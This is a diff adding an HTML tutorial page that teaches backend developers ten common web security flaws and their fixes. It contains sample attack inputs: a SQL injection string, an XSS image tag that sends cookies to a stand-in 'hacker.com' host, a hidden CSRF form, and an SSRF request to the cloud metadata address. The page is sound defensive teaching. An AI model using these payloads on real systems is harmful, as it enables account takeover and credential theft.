@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>03b - Web Security & Vulnerabilities (Top 10 Masterclass)</title>
+    <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+    <script type="module">
+        import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.esm.min.mjs';
+        mermaid.initialize({ startOnLoad: false, theme: 'default' });
+        
+        document.addEventListener('DOMContentLoaded', async () => {
+            const content = document.getElementById('markdown-content').textContent;
+            document.getElementById('content').innerHTML = marked.parse(content);
+            
+            const mermaidBlocks = document.querySelectorAll('code.language-mermaid');
+            mermaidBlocks.forEach(block => {
+                const pre = block.parentElement;
+                const div = document.createElement('div');
+                div.className = 'mermaid';
+                div.textContent = block.textContent;
+                pre.replaceWith(div);
+            });
+            
+            await mermaid.run();
+        });
+    </script>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; max-width: 1000px; margin: 0 auto; padding: 40px 20px; line-height: 1.7; color: #2c3e50; }
+        pre { background: #f8f9fa; padding: 20px; border-radius: 8px; overflow-x: auto; border: 1px solid #e9ecef; }
+        code { font-family: 'Fira Code', Consolas, Monaco, monospace; background: #f8f9fa; padding: 3px 6px; border-radius: 4px; font-size: 0.9em; color: #e83e8c; }
+        blockquote { border-left: 5px solid #c0392b; margin: 0; padding-left: 20px; background: #fdf5f5; padding-top: 10px; padding-bottom: 10px; border-radius: 0 8px 8px 0; }
+        .mermaid { margin: 40px 0; display: flex; justify-content: center; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
+        strong { color: #2c3e50; }
+        table { width: 100%; border-collapse: collapse; margin: 20px 0; font-size: 0.95em; }
+        th, td { border: 1px solid #ddd; padding: 12px; text-align: left; }
+        th { background-color: #f4f6f7; color: #2c3e50; font-weight: bold; }
+        .nav-bar { display: flex; justify-content: space-between; align-items: center; margin: 30px 0; padding: 15px 20px; background: #f8f9fa; border: 1px solid #e9ecef; border-radius: 8px; }
+        .nav-btn { background-color: #34495e; color: white !important; padding: 10px 20px; text-decoration: none; border-radius: 5px; font-weight: bold; transition: background 0.3s; display: inline-block; border-bottom: 3px solid #3498db; }
+        .nav-btn:hover { background-color: #2980b9; }
+        .nav-btn.disabled { background-color: #ccc; cursor: not-allowed; pointer-events: none; border-bottom: 3px solid #aaa; }
+
+        /* Standardized Heading Styles (No H1 or H2, matching Validation Masterclass) */
+        h3 { color: #2c3e50; font-size: 1.8em; border-bottom: 2px solid #34495e; padding-bottom: 8px; margin-top: 0; }
+        h4 { color: #c0392b; font-size: 1.4em; margin-top: 40px; border-bottom: 1px solid #eee; padding-bottom: 6px; }
+        h5 { color: #e74c3c; font-size: 1.1em; margin-top: 20px; }
+        h6 { color: #e74c3c; font-size: 1.0em; margin-top: 15px; }
+    </style>
+</head>
+<body>
+    <div class="nav-bar">
+        <a href="03a_Authentication_and_Authorization.html" class="nav-btn">&larr; Previous: Auth Deep Dive</a>
+        <a href="../index.html" class="nav-btn" style="background-color: #6c757d; border-bottom: 3px solid #495057;">🏠 Hub Index</a>
+        <a href="04_Caching_Basics.html" class="nav-btn">Next: Caching Basics &rarr;</a>
+    </div>
+    <div id="content"></div>
+    <div class="nav-bar">
+        <a href="03a_Authentication_and_Authorization.html" class="nav-btn">&larr; Previous: Auth Deep Dive</a>
+        <a href="../index.html" class="nav-btn" style="background-color: #6c757d; border-bottom: 3px solid #495057;">🏠 Hub Index</a>
+        <a href="04_Caching_Basics.html" class="nav-btn">Next: Caching Basics &rarr;</a>
+    </div>
+    <script type="text/markdown" id="markdown-content">
+### Backend Foundation 3b: Web Security & Vulnerabilities
+
+In backend engineering, functionality is only half the job. The other half is making sure hackers cannot destroy your database or steal your users' data. 
+
+The security industry tracks the most dangerous flaws via the **OWASP Top 10**. Here are the **Top 10 critical security concepts** every senior backend developer must memorize.
+
+---
+
+#### 1. Cryptography: How to Store Secrets Safely
+
+> [!WARNING]
+> **The Golden Rule:** NEVER store passwords in plain text. If your database is breached, hackers instantly have every user's password. 
+
+##### The Problem: Rainbow Tables
+Hackers know that the word "password" always hashes to `5baa61e4`. So they created "Rainbow Tables" (massive dictionaries of billions of pre-computed hashes). If they steal your database, they just look up the hashes in their dictionary.
+
+##### The Solution: Salting (bcrypt)
+Before hashing the password, the backend generates a random string of characters (the Salt) and attaches it to the password. 
+
+`Hash("password" + "random_salt_X7b9") = 8f72a4...`
+
+Now, even if two users have the exact same password, their hashes will look completely different in the database. In Node.js, libraries like `bcrypt` handle salting automatically.
+
+---
+
+#### 2. SQL Injection (SQLi)
+
+The oldest and most destructive vulnerability on the web. It occurs when you blindly trust user input and paste it directly into your database query.
+
+##### The Attack
+Imagine your backend code does this:
+`const query = "SELECT * FROM users WHERE email = '" + req.body.email + "'";`
+
+A hacker types this into the email login box: `' OR 1=1 --`
+The resulting SQL query becomes:
+`SELECT * FROM users WHERE email = '' OR 1=1 --'`
+
+Because `1=1` is mathematically always true, the database ignores the email check and logs the hacker into the very first account it finds (usually the Admin account). The `--` comments out the rest of the query.
+
+##### The Mitigation
+**Never** concatenate strings to build SQL queries. Instead, use Parameterized Queries (or an ORM like Prisma/TypeORM) which strictly treats the input as text, stripping it of all SQL code power.
+* **Safe:** `db.query("SELECT * FROM users WHERE email = ?", [req.body.email])`
+
+---
+
+#### 3. Cross-Site Scripting (XSS)
+
+SQL Injection attacks the Database. XSS attacks the User's Web Browser.
+
+##### The Attack
+A hacker leaves a comment on your blog, but instead of text, they write malicious JavaScript: 
+`<img src="x" onerror="fetch('https://hacker.com?stolen_cookie=' + document.cookie)">`
+
+Your backend saves this comment to the database. When an innocent user views the blog post, their browser tries to load the broken image, instantly triggers the `onerror` JavaScript, and sends their secret login cookie directly to the hacker.
+
+##### The Mitigations
+1. **Sanitize Input:** Never render raw HTML from users. Use libraries to strip out `<script>` tags before saving them to the database.
+2. **HttpOnly Cookies:** Store JWTs or Sessions in `HttpOnly` Cookies. This is a special flag that completely hides the cookie from JavaScript, making it impossible for an XSS script to read it.
+
+---
+
+#### 4. Cross-Site Request Forgery (CSRF)
+
+Also known as the "Confused Deputy" attack. This tricks the browser into performing actions the user did not intend.
+
+##### The Attack
+1. You log into `yourbank.com`. Your browser saves a login Cookie.
+2. The hacker tricks you into opening `cute-cats.com`. 
+3. Hidden on `cute-cats.com` is a malicious form: `<form action="https://yourbank.com/transfer?amount=10000&to=Hacker" method="POST">`
+4. The moment the page loads, JavaScript auto-submits the hidden form.
+5. Because you are still logged into the bank in another tab, your browser helpfully attaches your Bank Cookie to the request. The bank sees the valid cookie and approves the transfer!
+
+##### The Mitigations
+1. **SameSite Cookie Attribute:** Set your cookies to `SameSite=Lax` or `SameSite=Strict`. This tells the browser: *"NEVER send this cookie if the request originated from a different website."*
+2. **Anti-CSRF Tokens:** The backend generates a unique, hidden, random token when rendering a form, and requires it to be sent back.
+
+---
+
+#### 5. Insecure Direct Object References (IDOR) / Broken Access Control
+
+This is the #1 vulnerability on the modern web because it is a logic flaw, not a coding bug, so automated security scanners cannot detect it.
+
+##### The Attack
+A user logs into their bank account and clicks "View Receipt". The URL is:
+`https://bank.com/receipt/1004`
+
+The user maliciously changes the URL in their browser to:
+`https://bank.com/receipt/1005`
+
+If the backend code just says `SELECT * FROM receipts WHERE id = 1005`, the user just successfully read someone else's bank receipt!
+
+##### The Mitigation
+Always verify Authorization at the resource level. 
+`SELECT * FROM receipts WHERE id = 1005 AND user_id = CURRENT_LOGGED_IN_USER_ID`
+
+---
+
+#### 6. Server-Side Request Forgery (SSRF)
+
+This attack targets Cloud Infrastructure (like AWS, Azure, Google Cloud).
+
+##### The Attack
+You build a feature that lets users upload a profile picture from a URL (e.g., `https://example.com/image.png`). Your Node.js backend downloads the image and saves it.
+The hacker provides this URL instead: `http://169.254.169.254/latest/meta-data/`
+
+This specific IP address is the hidden internal AWS Metadata API. Your backend blindly fetches it, accidentally returning the cloud server's master Admin API keys back to the hacker!
+
+##### The Mitigation
+Never allow user-provided URLs to dictate server-side network requests without strict validation. Implement an "Allowlist" of acceptable domains, and explicitly block local/internal IP ranges.
+
+---
+
+#### 7. Security Misconfiguration & Data Exposure
+
+Sometimes the code is perfect, but the server setup ruins everything.
+
+##### The Attack (Information Leakage)
+If your Node.js app crashes in production and returns a massive "Stack Trace" (a massive block of red error code) to the user's browser, the hacker can read exactly what folder your code is in, what database you use, and sometimes even database passwords.
+
+##### The Mitigation
+1. Never show stack traces in Production. Always catch errors and return a generic `500 Internal Server Error, please try again later.`
+2. Use `.env` files to hide API keys; never hardcode them.
+3. Remove headers like `X-Powered-By: Express` so hackers don't know what framework you are using.
+
+---
+
+#### 8. Man-in-the-Middle (MitM) Attacks
+
+If you send data over HTTP (instead of HTTPS), everything is sent in raw plain text.
+
+##### The Attack
+A user goes to a coffee shop and logs into your website. A hacker on the same Wi-Fi network uses a packet sniffer to intercept the Wi-Fi waves. Because it's standard HTTP, the hacker easily reads the raw `"password": "mysecret"` JSON payload flying through the air.
+
+##### The Mitigation (TLS/SSL)
+Force the use of **HTTPS (TLS)**. This mathematically scrambles all data before it leaves the browser. Even if the hacker intercepts the Wi-Fi signal, they only see gibberish. You should also send the `Strict-Transport-Security` (HSTS) header to force browsers to *never* attempt an insecure HTTP connection.
+
+---
+
+#### 9. CORS (Cross-Origin Resource Sharing)
+
+CORS is a defense mechanism built into browsers, but it is often misunderstood by developers.
+
+##### The Concept
+By default, web browsers have a strict security rule: A frontend running on `http://localhost:3000` is **BLOCKED** from making API calls to a backend running on `http://localhost:8080` because they have different Origins (Ports).
+
+##### How it Works (Preflight Requests)
+When the frontend tries to call the backend, the browser first sends an invisible `OPTIONS` HTTP request (called a Preflight). 
+It asks the backend: *"Hey, is localhost:3000 allowed to talk to you?"*
+
+##### The Fix
+Your backend must explicitly send back HTTP Headers approving the connection using a CORS middleware. Do not use a wildcard `*` in production, as this allows any hacker's website to connect to your API!
+
+---
+
+#### 10. Rate Limiting and DDoS Attacks
+
+Your code might be completely secure, but what if a hacker just tries to break the server physically?
+
+##### The Attack (Brute Force / DDoS)
+* **Brute Force:** A hacker writes a script to guess a user's password 100,000 times a second on your `/login` route.
+* **DDoS (Distributed Denial of Service):** A hacker uses a botnet of 10,000 hacked computers to spam your server at the exact same time, completely overwhelming your CPU and taking your server offline.
+
+##### The Mitigations
+1. **Rate Limiting:** Track IP addresses in Redis. If one IP makes more than 5 login attempts in 15 minutes, block them temporarily (Return HTTP `429 Too Many Requests`).
+2. **Reverse Proxies (WAF):** Never put your Node.js server directly on the public internet. Put it behind a powerful Web Application Firewall like **Cloudflare**. They specialize in detecting DDoS attacks and dropping malicious traffic before it even touches your Node.js code.
+    </script>
+</body>
+</html>
